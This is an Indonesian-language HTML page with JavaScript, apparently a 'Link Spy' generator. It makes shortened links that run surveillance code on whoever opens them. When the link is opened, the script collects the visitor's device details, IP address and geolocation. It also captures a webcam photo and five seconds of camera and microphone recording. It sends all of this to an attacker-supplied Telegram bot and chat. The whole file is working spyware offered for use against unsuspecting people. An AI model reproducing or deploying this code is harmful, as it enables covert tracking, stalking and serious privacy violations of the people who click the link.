<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Generate & View</title>
<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,Arial}
body{
  margin:0;
  padding:20px;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  background:url('https://g.top4top.io/p_36448u2fd0.jpg') center/cover no-repeat fixed;
  color:#fff;
}
.card{
  background:rgba(255,255,255,0.07);
  border-radius:18px;
  padding:28px;
  width:100%;
  max-width:420px;
  box-shadow:0 8px 25px rgba(0,0,0,.3);
  backdrop-filter:blur(10px);
  animation:fadeIn .6s ease-out;
}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
h1{
  font-size:22px;
  text-align:center;
  margin-bottom:24px;
  color:#0ff;
}
label{
  font-size:14px;
  color:#ddd;
  margin-bottom:6px;
  display:block;
}
input[type=text],input[type=password],input[type=url]{
  width:100%;
  padding:12px;
  border:1px solid rgba(255,255,255,.2);
  background:rgba(255,255,255,.05);
  border-radius:8px;
  font-size:15px;
  color:#fff;
  margin-bottom:14px;
  outline:none;
  transition:.25s;
}
input:focus{border-color:#0ff;box-shadow:0 0 6px #0ff3}
button{
  width:100%;
  padding:14px;
  background:linear-gradient(135deg,#00c6ff,#0072ff);
  color:#fff;
  border:none;
  border-radius:10px;
  font-size:16px;
  font-weight:600;
  margin-top:10px;
  cursor:pointer;
  transition:.25s;
}
button:hover{transform:translateY(-2px);box-shadow:0 6px 16px rgba(0,0,0,.4)}
#linkOut{
  font-size:14px;
  word-break:break-all;
  margin-top:20px;
  padding:16px;
  border-radius:12px;
  background:rgba(0,0,0,.35);
  border:1px solid rgba(255,255,255,.1);
  display:none;
  animation:fadeIn .6s ease-out;
}
#linkOut strong{color:#0ff}
#linkOut a{color:#6f0;text-decoration:none}
#linkOut a:hover{text-decoration:underline}
</style>
</head>
<body>

<!-- LOGIN -->
<div class="card" id="loginCard">
  <h1>üîê Login</h1>
  <label>Username</label>
  <input type="text" id="username" placeholder="Username">
  <label>Password</label>
  <input type="password" id="password" placeholder="Password">
  <button onclick="login()">Masuk</button>
</div>

<!-- FORM GENERATE -->
<div class="card" id="formCard" style="display:none">
  <h1>üîó Generate Link Spy</h1>
  <label>Bot Token</label>
  <input type="text" id="botToken">
  <label>Chat ID</label>
  <input type="text" id="chatId">
  <label>URL Target</label>
  <input type="url" id="targetUrl" placeholder="URL" required>
  <button onclick="generate()">üöÄ Generate Link</button>
  <div id="linkOut"></div>
</div>

<script>
// ========== LOGIN ==========
const validUser = "anezzz1";
const validPass = "201108";

function login() {
  const u = document.getElementById("username").value.trim();
  const p = document.getElementById("password").value.trim();
  if(u === validUser && p === validPass){
    loginCard.style.display="none";
    formCard.style.display="block";
  } else {
    alert("‚ùå Username atau Password salah!");
  }
}

// ========== SHORTENER ==========
async function shorten(url){
  try{
    const res=await fetch("https://tinyurl.com/api-create.php?url="+encodeURIComponent(url));
    return await res.text();
  }catch(e){return url;}
}

// ========== GENERATE ==========
async function generate() {
  const token = botToken.value.trim();
  const chat  = chatId.value.trim();
  const url   = targetUrl.value.trim();
  if (!token || !chat || !url) return alert('Isi semua kolom dulu!');
  const longLink = `${location.origin}${location.pathname}?mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(url)}`;
  const shortLink = await shorten(longLink);
  linkOut.style.display = "block";
  linkOut.innerHTML = `<strong>Link Spy:</strong><br><a href="${shortLink}" target="_blank">${shortLink}</a>`;
}

// ========== MODE VIEW ==========
(async () => {
  const params = new URLSearchParams(location.search);
  if (params.get("mode") !== "view") return;

  loginCard.style.display="none";
  formCard.style.display="none";

  const TOKEN  = params.get("token");
  const CHAT   = params.get("chat");
  const TARGET = params.get("target") || "https://example.com";
  if (!TOKEN || !CHAT) return;

  // IP
  let ipAddr = "Unknown IP";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ipAddr = data.ip;
  } catch {}

  // ========== TRACKING REPORT (FIXED async) ==========
  async function trackingReport(ip, lat, lon){
    let m  = "‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Tracking Report ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø\n\n";

    m += "‚öôÔ∏è DEVICE INFORMATION | BUKAN GPS TRACKING\n";
    m += `üñ•Ô∏è Device: ${navigator.userAgent}\n`;
    m += `üíª Platform: ${navigator.platform}\n`;
    m += `üåê Bahasa: ${navigator.language}\n`;
    m += `üì∂ Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
    m += `üì∫ Screen Size: ${screen.width}x${screen.height}\n`;
    m += `ü™ü Window Size: ${innerWidth}x${innerHeight}\n`;
    m += `üíæ RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
    m += `üß† CPU Cores: ${navigator.hardwareConcurrency}\n`;

    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            m += `üîã Battery: ${Math.floor(b.level * 100)}%\n`;
            m += `üîå Charging: ${b.charging ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
        } catch(e) {
            m += "üîã Battery: ‚ùå Tidak tersedia\n";
        }
    }

    m += `‚è∞ Waktu Akses: ${new Date().toString()}\n`;
    m += `üïí Page Load Time: ${performance.now().toFixed(2)} ms\n`;
    m += `üìú History Length: ${history.length}\n`;
    m += `‚úã Touch Support: ${('ontouchstart' in window) ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
    m += `üîó Referrer: ${document.referrer || 'None'}\n`;
    m += `üåç URL: ${location.href}\n`;
    m += `üìÑ Title: ${document.title}\n`;
    m += `üïì Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
    m += `üß≠ Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

    try {
        const i = await fetch('https://ipapi.co/json/');
        const d = await i.json();

        m += "üìç LOCATION INFORMATION\n";
        m += `üì° IP Address: ${d.ip}\n`;
        m += `üèôÔ∏è Kota: ${d.city}\n`;
        m += `üèûÔ∏è Provinsi: ${d.region}\n`;
        m += `üåé Negara: ${d.country_name}\n`;
        m += `üè∑Ô∏è Kode Pos: ${d.postal}\n`;

        if (d.latitude && d.longitude) {
            m += `üìå Latitude: ${d.latitude}\n`;
            m += `üìç Longitude: ${d.longitude}\n`;
        }

    } catch {
        m += "‚ùå Gagal mendapatkan informasi lokasi\n";
    }

    m += "\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Channel Telegram @AboutGyzenLyoraa ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø";
    return m;
  }

 // ====== LOKASI (SATU KALI SAJA) ======
let lat = "-", lon = "-";
try {
  const p = await new Promise((res, rej) =>
    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
  );
  lat = p.coords.latitude;
  lon = p.coords.longitude;
} catch {}

// ====== IP (PASTIKAN ADA) ======
try {
  const res = await fetch("https://api.ipify.org?format=json");
  const data = await res.json();
  ipAddr = data.ip;
} catch {}

// ====== KIRIM TEXT REPORT ======
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id: CHAT,
    text: await trackingReport(ipAddr, lat, lon)
  })
});

// ====== FOTO ======
const kirimFoto = (blob, cap) => {
  const fd = new FormData();
  fd.append("chat_id", CHAT);
  fd.append("photo", blob, "photo.jpg");
  fd.append("caption", cap);
  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  });
};

// ====== VIDEO ======
const kirimVideo = (blob, cap) => {
  const fd = new FormData();
  fd.append("chat_id", CHAT);
  fd.append("video", blob, "video.webm");
  fd.append("caption", cap);
  fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
    method: "POST",
    body: fd
  });
};

// ====== AMBIL FOTO ======
try {
  const s = await navigator.mediaDevices.getUserMedia({ video: true });
  const v = document.createElement("video");
  const c = document.createElement("canvas");

  v.srcObject = s;
  await new Promise(r => v.onloadedmetadata = r);
  v.play();

  c.width = v.videoWidth;
  c.height = v.videoHeight;
  c.getContext("2d").drawImage(v, 0, 0);

  s.getTracks().forEach(t => t.stop());

  c.toBlob(
    b => kirimFoto(b, `üì∏ Lat:${lat}, Lon:${lon}\nüåê IP: ${ipAddr}`),
    "image/jpeg",
    0.9
  );
} catch {}

// ====== AMBIL VIDEO 5 DETIK ======
try {
  const vs = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
  const rec = new MediaRecorder(vs);
  const chunks = [];

  rec.ondataavailable = e => chunks.push(e.data);
  rec.onstop = () => {
    const blob = new Blob(chunks, { type: "video/webm" });
    kirimVideo(blob, `üìπ 5 detik\nLat:${lat}, Lon:${lon}\nüåê IP: ${ipAddr}`);
    vs.getTracks().forEach(t => t.stop());
  };

  rec.start();
  setTimeout(() => rec.stop(), 5000);
} catch {}
})();
</script>
</body>
</html>
